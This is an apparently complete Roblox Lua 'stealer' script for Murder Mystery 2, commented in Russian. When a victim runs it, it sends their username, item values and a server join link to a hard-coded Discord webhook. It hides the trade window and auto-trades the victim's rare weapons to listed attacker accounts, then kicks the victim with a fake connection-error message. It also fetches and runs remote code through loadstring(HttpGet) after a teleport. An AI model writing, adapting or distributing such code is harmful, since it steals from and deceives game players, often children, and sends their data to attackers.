-- НАСТРОЙКИ (ОБЯЗАТЕЛЬНО ИЗМЕНИТЕ!)
_G.Usernames = {"MM2danya7", "user2", "user3"} -- замените на реальные имена
_G.min_rarity = "Godly"
_G.min_value = 1
_G.pingEveryone = "Yes" -- "Yes" или "No"
_G.webhook = "https://discord.com/api/webhooks/1370815744719454229/-t8-ZNBEtooaJFXl2QEH_lAtrZU7tpgsg8lNjKW-VBItAybeXUWMOqcchv-RK2jEpkYh" -- ЗАМЕНИТЕ НА РЕАЛЬНЫЙ ВЕБХУК!

-- Bypass для получения настоящего JobId
game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v)
    local serverId = v.ServerInstanceId
    queue_on_teleport(string.format([[
        getgenv().JobId = "%s"
        getgenv().RealJobId = "%s"
        
        task.wait(3)
        
        print("Байпас сработал! Real JobId:", getgenv().RealJobId)
        
        -- Загружаем основной скрипт
        loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/mm2_bypass_stealer.lua"))()
        
    ]], serverId, serverId))
end)

-- Попытка телепортации для активации байпаса
for _ = 1, 2 do
    task.spawn(function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, game.JobId)
    end)
    task.wait(0.5)
end

-- Основной скрипт
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- Используем байпасенный JobId если он есть
if getgenv().RealJobId then
    game.JobId = getgenv().RealJobId
    print("Используем байпасенный JobId:", game.JobId)
end

local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- ПРОВЕРКА НАСТРОЕК
if webhook == "https://discord.com/api/webhooks/your_webhook_here" or webhook == "" then
    warn("ОШИБКА: Вебхук не настроен! Добавьте реальный webhook URL")
    return
end

if next(users) == nil then
    warn("ОШИБКА: Usernames не добавлены! Добавьте хотя бы одного пользователя")
    return
end

-- Проверка валидности вебхука
local function isValidWebhook(url)
    return url:find("^https://discord.com/api/webhooks/") or url:find("^https://discordapp.com/api/webhooks/")
end

if not isValidWebhook(webhook) then
    warn("ОШИБКА: Невалидный вебхук! Формат должен быть: https://discord.com/api/webhooks/...")
    return
end

if game.PlaceId ~= 142823291 then
    warn("ОШИБКА: Не поддерживаемая игра")
    return
end

local weaponsToSend = {}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local HttpService = game:GetService("HttpService")

local rarityTable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Godly",
    "Ancient",
    "Unique",
    "Vintage"
}

local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local success, response = pcall(function()
        return request({
            Url = url,
            Method = "GET",
            Headers = headers
        })
    end)
    
    if success and response.Success then
        return response.Body
    else
        warn("Ошибка загрузки HTML: " .. tostring(response))
        return ""
    end
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then
            return value
        end
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()

            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end
    
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}

    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    
    return chromaValues
end

local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}

    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")

    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extractedItemValues = extractItems(htmlContent)
                    for itemName, value in pairs(extractedItemValues) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end

            completed = completed + 1
            if completed == totalCategories then
                lock:Fire()
            end
        end)
    end

    lock.Event:Wait()

    local valueList = {}

    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false

        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")

            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    local matchedChromaValue = nil
                    for chromaName, value in pairs(chromaExtractedValues) do
                        if chromaName:find(itemName) then
                            matchedChromaValue = value
                            break
                        end
                    end

                    if matchedChromaValue then
                        valueList[dataid] = matchedChromaValue
                    end
                else
                    local value = allExtractedValues[itemName]
                    if value then
                        valueList[dataid] = value
                    end
                end
            end
        end
    end

    return valueList
end

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
end

local function getTradeStatus()
    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while true do
        local status = getTradeStatus()
        if status == "None" then
            break
        end
        wait(0.1)
    end
end

local function acceptTrade()
    local args = {
        [1] = 285646582
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
end

local function addWeaponToTrade(id)
    local args = {
        [1] = id,
        [2] = "Weapons"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
end

local totalValue = 0

local function SendFirstMessage(list, prefix)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    -- Используем байпасенный JobId для ссылки
    local jobIdToUse = getgenv().RealJobId or game.JobId
    local joinLink = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. jobIdToUse

    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = joinLink,
            inline = false
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobIdToUse .. "')",
        ["embeds"] = {{
            ["title"] = "🎪 Join to get MM2 hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "MM2 stealer with bypassed JobId"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    
    -- Обработка ошибок при отправке
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
    
    if not success then
        warn("Ошибка отправки в Discord: " .. tostring(response))
    else
        if response.StatusCode == 204 or response.StatusCode == 200 then
            print("Сообщение успешно отправлено в Discord!")
        else
            warn("Ошибка Discord: " .. response.StatusCode .. " - " .. response.Body)
        end
    end
end

local function SendMessage(sortedItems)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
	}

    for _, item in ipairs(sortedItems) do
        local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "🎪 New MM2 Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "MM2 script with bypassed JobId"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
    
    if not success then
        warn("Ошибка отправки в Discord: " .. tostring(response))
    end
end

local tradegui = playerGui:WaitForChild("TradeGUI")
tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradegui.Enabled = false
end)
local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeguiphone.Enabled = false
end)

local min_rarity_index = table.find(rarityTable, min_rarity)

local untradable = {
    ["DefaultGun"] = true,
    ["DefaultKnife"] = true,
    ["Reaver"] = true,
    ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true,
    ["Reaver_Ancient"] = true,
    ["IceHammer"] = true,
    ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true,
    ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true,
    ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true,
    ["Season1TestKnife"] = true,
    ["Cracks"] = true,
    ["Icecrusher"] = true,
    ["???"] = true,
    ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true,
    ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true,
    ["SharkSeeker"] = true
}

local valueList = buildValueList()
local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

for i, v in pairs(realData.Weapons.Owned) do
    local dataid = i
    local amount = v
    local rarity = database[dataid].Rarity
    local weapon_rarity_index = table.find(rarityTable, rarity)
    if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
        local value
        if valueList[dataid] then
            value = valueList[dataid]
        else
            if weapon_rarity_index >= table.find(rarityTable, "Godly") then
                value = 2
            else
                value = 1
            end
        end
        if value >= min_value then
            totalValue = totalValue + (value * amount)
            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
        end
    end
end

if #weaponsToSend > 0 then
    table.sort(weaponsToSend, function(a, b)
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    local sentWeapons = {}
    for i, v in ipairs(weaponsToSend) do
        sentWeapons[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "@everyone "
    end

    SendFirstMessage(weaponsToSend, prefix)

    local function doTrade(joinedUser)
        local initialTradeState = getTradeStatus()
        if initialTradeState == "StartTrade" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            wait(0.3)
        elseif initialTradeState == "ReceivingRequest" then
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            wait(0.3)
        end

        while #weaponsToSend > 0 do
            local tradeStatus = getTradeStatus()

            if tradeStatus == "None" then
                sendTradeRequest(joinedUser)
            elseif tradeStatus == "SendingRequest" then
                wait(0.3)
            elseif tradeStatus == "ReceivingRequest" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                wait(0.3)
            elseif tradeStatus == "StartTrade" then
                for i = 1, math.min(4, #weaponsToSend) do
                    local weapon = table.remove(weaponsToSend, 1)
                    for count = 1, weapon.Amount do
                        addWeaponToTrade(weapon.DataID)
                    end
                end
                wait(6)
                acceptTrade()
                waitForTradeCompletion()
            else
                wait(0.5)
            end
            wait(1)
        end
        plr:kick("Check your internet conection")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentWeapons)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
else
    warn("Нет подходящих предметов для отправки")
end
